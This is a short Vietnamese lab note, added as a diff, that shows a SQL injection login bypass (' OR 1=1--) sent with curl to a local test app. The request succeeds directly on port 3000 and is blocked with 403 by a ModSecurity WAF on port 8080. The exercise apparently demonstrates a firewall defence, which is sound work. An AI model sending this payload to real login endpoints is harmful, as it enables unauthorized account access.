@@ -1,0 +1,45 @@
+khi chạy lệnh độc curl ở cổng 3000 sẽ ra truy vấn thành công :
+
+
+D:\btvn ktpm>curl -i -X POST http://localhost:3000/rest/user/login -H "Content-Type: application/json" -d "{\"email\":\"' OR 1=1--\",\"password\":\"123\"}"
+HTTP/1.1 200 OK
+Access-Control-Allow-Origin: *
+X-Content-Type-Options: nosniff
+X-Frame-Options: SAMEORIGIN
+Feature-Policy: payment 'self'
+X-Recruiting: /#/jobs
+Content-Type: application/json; charset=utf-8
+Content-Length: 784
+ETag: W/"310-zSK/fA/eLFrsyqZ8WZgp15tXmnc"
+Vary: Accept-Encoding
+Date: Sun, 25 Oct 2026 10:55:56 GMT
+Connection: keep-alive
+Keep-Alive: timeout=5
+
+
+
+ngược lại khi chạy ở 8080 : WAF ModSecurity bắt được các ký tự độc hại (', --, OR 1=1) và chặn ngay lập tức với mã 403 Forbidden
+
+
+
+
+D:\btvn ktpm>curl -i -X POST http://localhost:8080/rest/user/login -H "Content-Type: application/json" -d "{\"email\":\"' OR 1=1--\",\"password\":\"123\"}"
+HTTP/1.1 403 Forbidden
+Date: Sun, 25 Oct 2026 10:56:41 GMT
+Content-Type: text/html
+Content-Length: 146
+Connection: keep-alive
+Server: nginx
+Access-Control-Allow-Origin: *
+Access-Control-Max-Age: 3600
+Access-Control-Allow-Methods: GET, POST, PUT, DELETE, OPTIONS
+Access-Control-Allow-Headers: *
+
+<html>
+<head><title>403 Forbidden</title></head>
+<body>
+<center><h1>403 Forbidden</h1></center>
+<hr><center>nginx</center>
+</body>
+</html>
+
